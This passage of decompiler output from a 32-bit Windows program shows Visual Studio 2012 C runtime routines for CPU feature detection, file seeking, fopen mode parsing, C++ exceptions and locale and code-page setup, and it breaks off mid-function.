// 
// Library: Visual Studio 2012 Release

undefined4 ___isa_available_init(void)

{
  int iVar1;
  uint *puVar2;
  BOOL BVar3;
  uint uVar4;
  
  DAT_0041bbd0 = 0;
  DAT_0041a588 = DAT_0041a588 | 1;
  BVar3 = IsProcessorFeaturePresent(10);
  if (BVar3 != 0) {
    DAT_0041bbd0 = 1;
    iVar1 = cpuid_Version_info(1);
    uVar4 = DAT_0041a588 | 2;
    if ((*(uint *)(iVar1 + 0xc) & 0x100000) != 0) {
      uVar4 = DAT_0041a588 | 6;
      DAT_0041bbd0 = 2;
    }
    DAT_0041a588 = uVar4;
    if ((*(uint *)(iVar1 + 0xc) & 0x10000000) != 0) {
      DAT_0041a588 = uVar4 | 8;
      DAT_0041bbd0 = 3;
    }
    iVar1 = cpuid_Extended_Feature_Enumeration_info(7);
    if ((*(uint *)(iVar1 + 4) & 0x200) != 0) {
      DAT_0041bbd4 = DAT_0041bbd4 | 2;
    }
    iVar1 = cpuid_basic_info(0);
    if (((*(int *)(iVar1 + 4) == 0x756e6547) && (*(int *)(iVar1 + 8) == 0x49656e69)) &&
       (*(int *)(iVar1 + 0xc) == 0x6c65746e)) {
      puVar2 = (uint *)cpuid_Version_info(1);
      uVar4 = *puVar2 & 0xfff3ff0;
      if ((((uVar4 == 0x106c0) || (uVar4 == 0x20660)) ||
          ((uVar4 == 0x20670 || ((uVar4 == 0x30650 || (uVar4 == 0x30660)))))) || (uVar4 == 0x30670))
      {
        DAT_0041bbd4 = DAT_0041bbd4 | 1;
      }
    }
  }
  return 0;
}



// Library Function - Single Match
//  __callnewh
// 
// Library: Visual Studio 2012 Release

int __cdecl __callnewh(size_t _Size)

{
  code *pcVar1;
  int iVar2;
  
  pcVar1 = (code *)DecodePointer(DAT_0041bbd8);
  if (pcVar1 != (code *)0x0) {
    iVar2 = (*pcVar1)(_Size);
    if (iVar2 != 0) {
      return 1;
    }
  }
  return 0;
}



void __cdecl FUN_0040c524(undefined4 param_1)

{
  DAT_0041bbd8 = param_1;
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

long __cdecl FUN_0040c531(uint param_1,long param_2,int param_3)

{
  ulong *puVar1;
  int *piVar2;
  long lVar3;
  int iVar4;
  
  if (param_1 == 0xfffffffe) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < (int)param_1) && (param_1 < DAT_0041cf60)) {
      iVar4 = (param_1 & 0x1f) * 0x40;
      if ((*(byte *)((&DAT_0041b8c0)[(int)param_1 >> 5] + 4 + iVar4) & 1) != 0) {
        ___lock_fhandle(param_1);
        if ((*(byte *)((&DAT_0041b8c0)[(int)param_1 >> 5] + 4 + iVar4) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          lVar3 = -1;
        }
        else {
          lVar3 = __lseek_nolock(param_1,param_2,param_3);
        }
        FUN_0040c5ea();
        return lVar3;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    FUN_00407ceb();
  }
  return -1;
}



void FUN_0040c5ea(void)

{
  int unaff_ESI;
  
  __unlock_fhandle(unaff_ESI);
  return;
}



// Library Function - Single Match
//  __lseek_nolock
// 
// Library: Visual Studio 2012 Release

long __cdecl __lseek_nolock(int _FileHandle,long _Offset,int _Origin)

{
  byte *pbVar1;
  HANDLE hFile;
  int *piVar2;
  DWORD DVar3;
  DWORD DVar4;
  
  hFile = (HANDLE)FUN_0040fdd6(_FileHandle);
  if (hFile == (HANDLE)0xffffffff) {
    piVar2 = __errno();
    *piVar2 = 9;
    DVar3 = 0xffffffff;
  }
  else {
    DVar4 = 0;
    DVar3 = SetFilePointer(hFile,_Offset,(PLONG)0x0,_Origin);
    if (DVar3 == 0xffffffff) {
      DVar4 = GetLastError();
    }
    if (DVar4 == 0) {
      pbVar1 = (byte *)((&DAT_0041b8c0)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40);
      *pbVar1 = *pbVar1 & 0xfd;
    }
    else {
      FID_conflict___dosmaperr(DVar4);
      DVar3 = 0xffffffff;
    }
  }
  return DVar3;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

longlong __cdecl FUN_0040c685(uint param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  longlong lVar4;
  int in_stack_ffffffc4;
  
  if (param_1 == 0xfffffffe) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < (int)param_1) && (param_1 < DAT_0041cf60)) {
      iVar3 = (param_1 & 0x1f) * 0x40;
      if ((*(byte *)((&DAT_0041b8c0)[(int)param_1 >> 5] + 4 + iVar3) & 1) != 0) {
        ___lock_fhandle(param_1);
        if ((*(byte *)((&DAT_0041b8c0)[(int)param_1 >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          lVar4 = -1;
        }
        else {
          lVar4 = __lseeki64_nolock(param_1,CONCAT44(param_4,param_3),in_stack_ffffffc4);
        }
        FUN_0040c757();
        return lVar4;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    FUN_00407ceb();
  }
  return -1;
}



void FUN_0040c757(void)

{
  int unaff_EDI;
  
  __unlock_fhandle(unaff_EDI);
  return;
}



// Library Function - Single Match
//  __lseeki64_nolock
// 
// Library: Visual Studio 2012 Release

longlong __cdecl __lseeki64_nolock(int _FileHandle,longlong _Offset,int _Origin)

{
  byte *pbVar1;
  LARGE_INTEGER liDistanceToMove;
  HANDLE hFile;
  int *piVar2;
  BOOL BVar3;
  DWORD DVar4;
  DWORD unaff_EDI;
  undefined4 local_c;
  undefined4 local_8;
  
  hFile = (HANDLE)FUN_0040fdd6(_FileHandle);
  if (hFile == (HANDLE)0xffffffff) {
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    liDistanceToMove.s.HighPart = (LONG)&local_c;
    liDistanceToMove.s.LowPart = (undefined4)_Offset;
    BVar3 = SetFilePointerEx(hFile,liDistanceToMove,_Offset._4_4_,unaff_EDI);
    if (BVar3 != 0) {
      pbVar1 = (byte *)((&DAT_0041b8c0)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40);
      *pbVar1 = *pbVar1 & 0xfd;
      goto LAB_0040c7ee;
    }
    DVar4 = GetLastError();
    FID_conflict___dosmaperr(DVar4);
  }
  local_c = 0xffffffff;
  local_8 = 0xffffffff;
LAB_0040c7ee:
  return CONCAT44(local_8,local_c);
}



// WARNING: This is an inlined function
// Library Function - Single Match
//  __chkstk
// 
// Library: Visual Studio 2012 Release

void __alloca_probe(void)

{
  undefined *in_EAX;
  undefined4 *puVar1;
  undefined4 *puVar2;
  undefined4 unaff_retaddr;
  undefined auStack_4 [4];
  
  puVar2 = (undefined4 *)((int)&stack0x00000000 - (int)in_EAX & ~-(uint)(&stack0x00000000 < in_EAX))
  ;
  for (puVar1 = (undefined4 *)((uint)auStack_4 & 0xfffff000); puVar2 < puVar1;
      puVar1 = puVar1 + -0x400) {
  }
  *puVar2 = unaff_retaddr;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __openfile
// 
// Library: Visual Studio 2012 Release

FILE * __cdecl __openfile(char *_Filename,char *_Mode,int _ShFlag,FILE *_File)

{
  char cVar1;
  bool bVar2;
  bool bVar3;
  bool bVar4;
  uchar uVar5;
  int *piVar6;
  int iVar7;
  errno_t eVar8;
  uint _OpenFlag;
  char *pcVar9;
  uchar *puVar10;
  uchar *puVar11;
  uint uVar12;
  int local_8;
  
  bVar4 = false;
  local_8 = 0;
  bVar3 = false;
  for (pcVar9 = _Mode; *pcVar9 == ' '; pcVar9 = pcVar9 + 1) {
  }
  cVar1 = *pcVar9;
  if (cVar1 == 'a') {
    _OpenFlag = 0x109;
LAB_0040c886:
    uVar12 = DAT_0041bd58 | 2;
  }
  else {
    if (cVar1 != 'r') {
      if (cVar1 != 'w') goto LAB_0040c85c;
      _OpenFlag = 0x301;
      goto LAB_0040c886;
    }
    _OpenFlag = 0;
    uVar12 = DAT_0041bd58 | 1;
  }
  bVar2 = true;
  puVar10 = (uchar *)(pcVar9 + 1);
  uVar5 = *puVar10;
  if (uVar5 != '\0') {
    _Mode = (char *)0x1000;
    do {
      if (!bVar2) break;
      iVar7 = (int)(char)uVar5;
      if (iVar7 < 0x54) {
        if (iVar7 == 0x53) {
          if (local_8 != 0) goto LAB_0040c998;
          local_8 = 1;
          _OpenFlag = _OpenFlag | 0x20;
        }
        else if (iVar7 != 0x20) {
          if (iVar7 == 0x2b) {
            if ((_OpenFlag & 2) != 0) goto LAB_0040c998;
            _OpenFlag = _OpenFlag & 0xfffffffe | 2;
            uVar12 = uVar12 & 0xfffffffc | 0x80;
          }
          else if (iVar7 == 0x2c) {
            bVar3 = true;
LAB_0040c998:
            bVar2 = false;
          }
          else if (iVar7 == 0x44) {
            if ((_OpenFlag & 0x40) != 0) goto LAB_0040c998;
            _OpenFlag = _OpenFlag | 0x40;
          }
          else if (iVar7 == 0x4e) {
            _OpenFlag = _OpenFlag | 0x80;
          }
          else {
            if (iVar7 != 0x52) goto LAB_0040c85c;
            if (local_8 != iVar7 + -0x52) goto LAB_0040c998;
            local_8 = 1;
            _OpenFlag = _OpenFlag | 0x10;
          }
        }
      }
      else if (iVar7 == 0x54) {
        if ((_OpenFlag & 0x1000) != 0) goto LAB_0040c998;
        _OpenFlag = _OpenFlag | 0x1000;
      }
      else if (iVar7 == 0x62) {
        if ((_OpenFlag & 0xc000) != 0) goto LAB_0040c998;
        _OpenFlag = _OpenFlag | 0x8000;
      }
      else if (iVar7 == 99) {
        if (bVar4) goto LAB_0040c998;
        bVar4 = true;
        uVar12 = uVar12 | 0x4000;
      }
      else if (iVar7 == 0x6e) {
        if (bVar4) goto LAB_0040c998;
        bVar4 = true;
        uVar12 = uVar12 & 0xffffbfff;
      }
      else {
        if (iVar7 != 0x74) goto LAB_0040c85c;
        if ((_OpenFlag & 0xc000) != 0) goto LAB_0040c998;
        _OpenFlag = _OpenFlag | 0x4000;
      }
      puVar10 = puVar10 + 1;
      uVar5 = *puVar10;
    } while (uVar5 != '\0');
    if (bVar3) {
      for (; *puVar10 == ' '; puVar10 = puVar10 + 1) {
      }
      iVar7 = __mbsnbcmp(&DAT_0041505c,puVar10,3);
      if (iVar7 != 0) goto LAB_0040c85c;
      for (puVar10 = puVar10 + 3; *puVar10 == ' '; puVar10 = puVar10 + 1) {
      }
      if (*puVar10 != '=') goto LAB_0040c85c;
      do {
        puVar11 = puVar10;
        puVar10 = puVar11 + 1;
      } while (*puVar10 == ' ');
      iVar7 = __mbsnbicmp(puVar10,(uchar *)s_UTF_8_00415060,5);
      if (iVar7 == 0) {
        puVar10 = puVar11 + 6;
        _OpenFlag = _OpenFlag | 0x40000;
      }
      else {
        iVar7 = __mbsnbicmp(puVar10,(uchar *)s_UTF_16LE_00415068,8);
        if (iVar7 == 0) {
          puVar10 = puVar11 + 9;
          _OpenFlag = _OpenFlag | 0x20000;
        }
        else {
          iVar7 = __mbsnbicmp(puVar10,(uchar *)s_UNICODE_00415074,7);
          if (iVar7 != 0) goto LAB_0040c85c;
          puVar10 = puVar11 + 8;
          _OpenFlag = _OpenFlag | 0x10000;
        }
      }
    }
  }
  for (; *puVar10 == ' '; puVar10 = puVar10 + 1) {
  }
  if (*puVar10 == '\0') {
    eVar8 = __sopen_s((int *)&_Mode,_Filename,_OpenFlag,_ShFlag,0x180);
    if (eVar8 != 0) {
      return (FILE *)0x0;
    }
    _DAT_0041b24c = _DAT_0041b24c + 1;
    _File->_cnt = 0;
    _File->_ptr = (char *)0x0;
    _File->_base = (char *)0x0;
    _File->_tmpfname = (char *)0x0;
    _File->_flag = uVar12;
    _File->_file = (int)_Mode;
    return _File;
  }
LAB_0040c85c:
  piVar6 = __errno();
  *piVar6 = 0x16;
  FUN_00407ceb();
  return (FILE *)0x0;
}



// Library Function - Single Match
//  public: __thiscall std::exception::exception(char const * const &,int)
// 
// Library: Visual Studio 2012 Release

exception * __thiscall std::exception::exception(exception *this,char **param_1,int param_2)

{
  *(undefined ***)this = vftable;
  *(char **)(this + 4) = *param_1;
  this[8] = (exception)0x0;
  return this;
}



// Library Function - Single Match
//  public: __thiscall std::exception::exception(class std::exception const &)
// 
// Library: Visual Studio 2012 Release

exception * __thiscall std::exception::exception(exception *this,exception *param_1)

{
  *(undefined4 *)(this + 4) = 0;
  *(undefined ***)this = vftable;
  this[8] = (exception)0x0;
  operator=(this,param_1);
  return this;
}



void __fastcall FUN_0040cae1(undefined4 *param_1)

{
  *param_1 = std::exception::vftable;
  std::exception::_Tidy((exception *)param_1);
  return;
}



// Library Function - Single Match
//  public: class std::exception & __thiscall std::exception::operator=(class std::exception const
// &)
// 
// Library: Visual Studio 2012 Release

exception * __thiscall std::exception::operator=(exception *this,exception *param_1)

{
  if (this != param_1) {
    _Tidy(this);
    if (param_1[8] == (exception)0x0) {
      *(undefined4 *)(this + 4) = *(undefined4 *)(param_1 + 4);
    }
    else {
      _Copy_str(this,*(char **)(param_1 + 4));
    }
  }
  return this;
}



undefined4 * __thiscall FUN_0040cb1f(void *this,byte param_1)

{
  *(undefined ***)this = std::exception::vftable;
  std::exception::_Tidy((exception *)this);
  if ((param_1 & 1) != 0) {
    FID_conflict__free(this);
  }
  return (undefined4 *)this;
}



// Library Function - Single Match
//  private: void __thiscall std::exception::_Copy_str(char const *)
// 
// Library: Visual Studio 2012 Release

void __thiscall std::exception::_Copy_str(exception *this,char *param_1)

{
  size_t sVar1;
  char *_Dst;
  
  if (param_1 != (char *)0x0) {
    sVar1 = _strlen(param_1);
    _Dst = (char *)_malloc(sVar1 + 1);
    *(char **)(this + 4) = _Dst;
    if (_Dst != (char *)0x0) {
      _strcpy_s(_Dst,sVar1 + 1,param_1);
      this[8] = (exception)0x1;
    }
  }
  return;
}



// Library Function - Single Match
//  private: void __thiscall std::exception::_Tidy(void)
// 
// Library: Visual Studio 2012 Release

void __thiscall std::exception::_Tidy(exception *this)

{
  if (this[8] != (exception)0x0) {
    FID_conflict__free(*(void **)(this + 4));
  }
  *(undefined4 *)(this + 4) = 0;
  this[8] = (exception)0x0;
  return;
}



char * __fastcall FUN_0040cb9e(int param_1)

{
  char *pcVar1;
  
  pcVar1 = *(char **)(param_1 + 4);
  if (pcVar1 == (char *)0x0) {
    pcVar1 = s_Unknown_exception_00415088;
  }
  return pcVar1;
}



// Library Function - Single Match
//  __CxxThrowException@8
// 
// Library: Visual Studio 2012 Release

void __CxxThrowException_8(int *param_1,byte *param_2)

{
  int iVar1;
  DWORD *pDVar2;
  DWORD *pDVar3;
  DWORD local_24 [4];
  DWORD local_14;
  ULONG_PTR local_10;
  int *local_c;
  byte *local_8;
  
  pDVar2 = &DAT_0041509c;
  pDVar3 = local_24;
  for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {
    *pDVar3 = *pDVar2;
    pDVar2 = pDVar2 + 1;
    pDVar3 = pDVar3 + 1;
  }
  if ((param_2 != (byte *)0x0) && ((*param_2 & 0x10) != 0)) {
    param_2 = *(byte **)(*(int *)(*param_1 + -4) + 0x18);
  }
  local_c = param_1;
  if ((param_2 != (byte *)0x0) && ((*param_2 & 8) != 0)) {
    local_10 = 0x1994000;
  }
  local_8 = param_2;
  RaiseException(local_24[0],local_24[1],local_14,&local_10);
  return;
}



// Library Function - Single Match
//  public: virtual __thiscall type_info::~type_info(void)
// 
// Library: Visual Studio 2012 Release

void __thiscall type_info::~type_info(type_info *this)

{
  *(undefined ***)this = vftable;
  _Type_info_dtor(this);
  return;
}



// Library Function - Single Match
//  public: virtual void * __thiscall type_info::`scalar deleting destructor'(unsigned int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release

void * __thiscall type_info::_scalar_deleting_destructor_(type_info *this,uint param_1)

{
  ~type_info(this);
  if ((param_1 & 1) != 0) {
    FID_conflict__free(this);
  }
  return this;
}



// Library Function - Single Match
//  ___addlocaleref
// 
// Library: Visual Studio 2012 Release

void __cdecl ___addlocaleref(LONG *param_1)

{
  LONG *pLVar1;
  LONG **ppLVar2;
  
  pLVar1 = param_1;
  InterlockedIncrement(param_1);
  if (param_1[0x1e] != 0) {
    InterlockedIncrement((LONG *)param_1[0x1e]);
  }
  if ((LONG *)param_1[0x20] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x20]);
  }
  if (param_1[0x1f] != 0) {
    InterlockedIncrement((LONG *)param_1[0x1f]);
  }
  if ((LONG *)param_1[0x22] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x22]);
  }
  ppLVar2 = (LONG **)(param_1 + 7);
  param_1 = (LONG *)0x6;
  do {
    if ((ppLVar2[-2] != (LONG *)&DAT_0041aad0) && (*ppLVar2 != (LONG *)0x0)) {
      InterlockedIncrement(*ppLVar2);
    }
    if ((ppLVar2[-3] != (LONG *)0x0) && (ppLVar2[-1] != (LONG *)0x0)) {
      InterlockedIncrement(ppLVar2[-1]);
    }
    ppLVar2 = ppLVar2 + 4;
    param_1 = (LONG *)((int)param_1 + -1);
  } while (param_1 != (LONG *)0x0);
  InterlockedIncrement((LONG *)(pLVar1[0x27] + 0xb0));
  return;
}



// Library Function - Single Match
//  ___freetlocinfo
// 
// Library: Visual Studio 2012 Release

void __cdecl ___freetlocinfo(void *param_1)

{
  int *piVar1;
  undefined **ppuVar2;
  void *_Memory;
  void **ppvVar3;
  int **ppiVar4;
  
  _Memory = param_1;
  if ((((*(undefined ***)((int)param_1 + 0x84) != (undefined **)0x0) &&
       (*(undefined ***)((int)param_1 + 0x84) != &PTR_DAT_0041ae88)) &&
      (*(int **)((int)param_1 + 0x78) != (int *)0x0)) && (**(int **)((int)param_1 + 0x78) == 0)) {
    piVar1 = *(int **)((int)param_1 + 0x80);
    if ((piVar1 != (int *)0x0) && (*piVar1 == 0)) {
      FID_conflict__free(piVar1);
      ___free_lconv_mon(*(int *)((int)param_1 + 0x84));
    }
    piVar1 = *(int **)((int)param_1 + 0x7c);
    if ((piVar1 != (int *)0x0) && (*piVar1 == 0)) {
      FID_conflict__free(piVar1);
      ___free_lconv_num(*(void ***)((int)param_1 + 0x84));
    }
    FID_conflict__free(*(void **)((int)param_1 + 0x78));
    FID_conflict__free(*(void **)((int)param_1 + 0x84));
  }
  if ((*(int **)((int)param_1 + 0x88) != (int *)0x0) && (**(int **)((int)param_1 + 0x88) == 0)) {
    FID_conflict__free((void *)(*(int *)((int)param_1 + 0x8c) + -0xfe));
    FID_conflict__free((void *)(*(int *)((int)param_1 + 0x94) + -0x80));
    FID_conflict__free((void *)(*(int *)((int)param_1 + 0x98) + -0x80));
    FID_conflict__free(*(void **)((int)param_1 + 0x88));
  }
  ppuVar2 = *(undefined ***)((int)param_1 + 0x9c);
  if ((ppuVar2 != &PTR_DAT_0041aad8) && (ppuVar2[0x2c] == (undefined *)0x0)) {
    ___free_lc_time(ppuVar2);
    FID_conflict__free(*(void **)((int)param_1 + 0x9c));
  }
  ppvVar3 = (void **)((int)param_1 + 0xa0);
  ppiVar4 = (int **)((int)param_1 + 0x1c);
  param_1 = (void *)0x6;
  do {
    if (((ppiVar4[-2] != (int *)&DAT_0041aad0) && (piVar1 = *ppiVar4, piVar1 != (int *)0x0)) &&
       (*piVar1 == 0)) {
      FID_conflict__free(piVar1);
      FID_conflict__free(*ppvVar3);
    }
    if (((ppiVar4[-3] != (int *)0x0) && (piVar1 = ppiVar4[-1], piVar1 != (int *)0x0)) &&
       (*piVar1 == 0)) {
      FID_conflict__free(piVar1);
    }
    ppvVar3 = ppvVar3 + 1;
    ppiVar4 = ppiVar4 + 4;
    param_1 = (void *)((int)param_1 + -1);
  } while (param_1 != (void *)0x0);
  FID_conflict__free(_Memory);
  return;
}



// Library Function - Single Match
//  ___removelocaleref
// 
// Library: Visual Studio 2012 Release

LONG * __cdecl ___removelocaleref(LONG *param_1)

{
  LONG *pLVar1;
  LONG **ppLVar2;
  
  pLVar1 = param_1;
  if (param_1 != (LONG *)0x0) {
    InterlockedDecrement(param_1);
    if (param_1[0x1e] != 0) {
      InterlockedDecrement((LONG *)param_1[0x1e]);
    }
    if ((LONG *)param_1[0x20] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x20]);
    }
    if (param_1[0x1f] != 0) {
      InterlockedDecrement((LONG *)param_1[0x1f]);
    }
    if ((LONG *)param_1[0x22] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x22]);
    }
    ppLVar2 = (LONG **)(param_1 + 7);
    param_1 = (LONG *)0x6;
    do {
      if ((ppLVar2[-2] != (LONG *)&DAT_0041aad0) && (*ppLVar2 != (LONG *)0x0)) {
        InterlockedDecrement(*ppLVar2);
      }
      if ((ppLVar2[-3] != (LONG *)0x0) && (ppLVar2[-1] != (LONG *)0x0)) {
        InterlockedDecrement(ppLVar2[-1]);
      }
      ppLVar2 = ppLVar2 + 4;
      param_1 = (LONG *)((int)param_1 + -1);
    } while (param_1 != (LONG *)0x0);
    InterlockedDecrement((LONG *)(pLVar1[0x27] + 0xb0));
  }
  return pLVar1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___updatetlocinfo
// 
// Library: Visual Studio 2012 Release

pthreadlocinfo __cdecl ___updatetlocinfo(void)

{
  _ptiddata p_Var1;
  pthreadlocinfo ptVar2;
  
  p_Var1 = __getptd();
  if (((p_Var1->_ownlocale & DAT_0041ad04) == 0) || (p_Var1->ptlocinfo == (pthreadlocinfo)0x0)) {
    __lock(0xc);
    ptVar2 = (pthreadlocinfo)
             __updatetlocinfoEx_nolock((LONG **)&p_Var1->ptlocinfo,(LONG *)PTR_DAT_0041ac3c);
    FUN_0040cf2b();
  }
  else {
    p_Var1 = __getptd();
    ptVar2 = p_Var1->ptlocinfo;
  }
  if (ptVar2 == (pthreadlocinfo)0x0) {
    __amsg_exit(0x20);
  }
  return ptVar2;
}



void FUN_0040cf2b(void)

{
  FUN_0040ed0f(0xc);
  return;
}



// Library Function - Single Match
//  __updatetlocinfoEx_nolock
// 
// Library: Visual Studio 2012 Release

LONG * __cdecl __updatetlocinfoEx_nolock(LONG **param_1,LONG *param_2)

{
  LONG *pLVar1;
  
  if ((param_2 == (LONG *)0x0) || (param_1 == (LONG **)0x0)) {
    param_2 = (LONG *)0x0;
  }
  else {
    pLVar1 = *param_1;
    if (pLVar1 != param_2) {
      *param_1 = param_2;
      ___addlocaleref(param_2);
      if (((pLVar1 != (LONG *)0x0) && (___removelocaleref(pLVar1), *pLVar1 == 0)) &&
         (pLVar1 != (LONG *)&DAT_0041ac40)) {
        ___freetlocinfo(pLVar1);
      }
    }
  }
  return param_2;
}



// Library Function - Single Match
//  wchar_t const * __cdecl CPtoLocaleName(int)
// 
// Library: Visual Studio 2012 Release

wchar_t * __cdecl CPtoLocaleName(int param_1)

{
  if (param_1 == 0x3a4) {
    return (wchar_t *)PTR_u_ja_JP_004150c4;
  }
  if (param_1 == 0x3a8) {
    return (wchar_t *)PTR_u_zh_CN_004150c8;
  }
  if (param_1 == 0x3b5) {
    return (wchar_t *)PTR_u_ko_KR_004150cc;
  }
  if (param_1 != 0x3b6) {
    return (wchar_t *)0x0;
  }
  return (wchar_t *)PTR_u_zh_TW_004150d0;
}



// Library Function - Single Match
//  int __cdecl getSystemCP(int)
// 
// Library: Visual Studio 2012 Release

int __cdecl getSystemCP(int param_1)

{
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,(localeinfo_struct *)0x0);
  DAT_0041bbf8 = 0;
  if (param_1 == -2) {
    DAT_0041bbf8 = 1;
    param_1 = GetOEMCP();
  }
  else if (param_1 == -3) {
    DAT_0041bbf8 = 1;
    param_1 = GetACP();
  }
  else if (param_1 == -4) {
    DAT_0041bbf8 = 1;
    param_1 = *(UINT *)(local_14[0] + 4);
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return param_1;
}



// Library Function - Single Match
//  void __cdecl setSBCS(struct threadmbcinfostruct *)
// 
// Library: Visual Studio 2012 Release

void __cdecl setSBCS(threadmbcinfostruct *param_1)

{
  int iVar1;
  uchar *puVar2;
  
  puVar2 = param_1->mbctype;
  FUN_00409600((uint *)puVar2,0,0x101);
  param_1->mbcodepage = 0;
  param_1->ismbcodepage = 0;
  param_1->mblocalename = (wchar_t *)0x0;
  *(undefined4 *)param_1->mbulinfo = 0;
  *(undefined4 *)(param_1->mbulinfo + 2) = 0;
  *(undefined4 *)(param_1->mbulinfo + 4) = 0;
  iVar1 = 0x101;
  do {
    *puVar2 = puVar2[(int)&DAT_0041a8a8 - (int)param_1];
    puVar2 = puVar2 + 1;
    iVar1 = iVar1 + -1;
  } while (iVar1 != 0);
  puVar2 = param_1->mbcasemap;
  iVar1 = 0x100;
  do {
    *puVar2 = puVar2[(int)&DAT_0041a8a8 - (int)param_1];
    puVar2 = puVar2 + 1;
    iVar1 = iVar1 + -1;
  } while (iVar1 != 0);
  return;
}



// Library Function - Single Match
//  void __cdecl setSBUpLow(struct threadmbcinfostruct *)
// 
// Library: Visual Studio 2012 Release

void __cdecl setSBUpLow(threadmbcinfostruct *param_1)

{
  byte bVar1;
  uchar uVar2;
  BOOL BVar3;
  uint uVar4;
  BYTE *pBVar5;
  uchar *puVar6;
  _cpinfo local_51c;
  WORD local_508 [256];
  uchar local_308 [256];
  uchar local_208 [256];
  CHAR local_108 [256];
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  BVar3 = GetCPInfo(param_1->mbcodepage,&local_51c);
  if (BVar3 == 0) {
    uVar4 = 0;
    do {
      puVar6 = param_1->mbcasemap + uVar4;
      if (puVar6 + (-0x61 - (int)param_1->mbcasemap) + 0x20 < (uchar *)0x1a) {
        param_1->mbctype[uVar4 + 1] = param_1->mbctype[uVar4 + 1] | 0x10;
        uVar2 = (char)uVar4 + ' ';
LAB_0040d214:
        *puVar6 = uVar2;
      }
      else {
        if (puVar6 + (-0x61 - (int)param_1->mbcasemap) < (uchar *)0x1a) {
          param_1->mbctype[uVar4 + 1] = param_1->mbctype[uVar4 + 1] | 0x20;
          uVar2 = (char)uVar4 + 0xe0;
          goto LAB_0040d214;
        }
        *puVar6 = '\0';
      }
      uVar4 = uVar4 + 1;
    } while (uVar4 < 0x100);
  }
  else {
    uVar4 = 0;
    do {
      local_108[uVar4] = (CHAR)uVar4;
      uVar4 = uVar4 + 1;
    } while (uVar4 < 0x100);
    local_108[0] = ' ';
    pBVar5 = local_51c.LeadByte;
    while (local_51c.LeadByte[0] != 0) {
      bVar1 = pBVar5[1];
      for (uVar4 = (uint)local_51c.LeadByte[0]; (uVar4 <= bVar1 && (uVar4 < 0x100));
          uVar4 = uVar4 + 1) {
        local_108[uVar4] = ' ';
      }
      pBVar5 = pBVar5 + 2;
      local_51c.LeadByte[0] = *pBVar5;
    }
    ___crtGetStringTypeA((_locale_t)0x0,1,local_108,0x100,local_508,param_1->mbcodepage,0);
    ___crtLCMapStringA((_locale_t)0x0,param_1->mblocalename,0x100,local_108,0x100,(LPSTR)local_208,
                       0x100,param_1->mbcodepage,0);
    ___crtLCMapStringA((_locale_t)0x0,param_1->mblocalename,0x200,local_108,0x100,(LPSTR)local_308,
                       0x100,param_1->mbcodepage,0);
    uVar4 = 0;
    do {
      if ((local_508[uVar4] & 1) == 0) {
        if ((local_508[uVar4] & 2) != 0) {
          param_1->mbctype[uVar4 + 1] = param_1->mbctype[uVar4 + 1] | 0x20;
          uVar2 = local_308[uVar4];
          goto LAB_0040d1bd;
        }
        param_1->mbcasemap[uVar4] = '\0';
      }
      else {
        param_1->mbctype[uVar4 + 1] = param_1->mbctype[uVar4 + 1] | 0x10;
        uVar2 = local_208[uVar4];
LAB_0040d1bd:
        param_1->mbcasemap[uVar4] = uVar2;
      }
      uVar4 = uVar4 + 1;
    } while (uVar4 < 0x100);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___updatetmbcinfo
// 
// Library: Visual Studio 2012 Release

pthreadmbcinfo __cdecl ___updatetmbcinfo(void)

{
  _ptiddata p_Var1;
  LONG LVar2;
  pthreadmbcinfo lpAddend;
  
  p_Var1 = __getptd();
  if (((p_Var1->_ownlocale & DAT_0041ad04) == 0) || (p_Var1->ptlocinfo == (pthreadlocinfo)0x0)) {
    __lock(0xd);
    lpAddend = p_Var1->ptmbcinfo;
    if (lpAddend != (pthreadmbcinfo)PTR_DAT_0041a5a8) {
      if (lpAddend != (pthreadmbcinfo)0x0) {
        LVar2 = InterlockedDecrement(&lpAddend->refcount);
        if ((LVar2 == 0) && (lpAddend != (pthreadmbcinfo)&DAT_0041a8a8)) {
          FID_conflict__free(lpAddend);
        }
      }
      p_Var1->ptmbcinfo = (pthreadmbcinfo)PTR_DAT_0041a5a8;
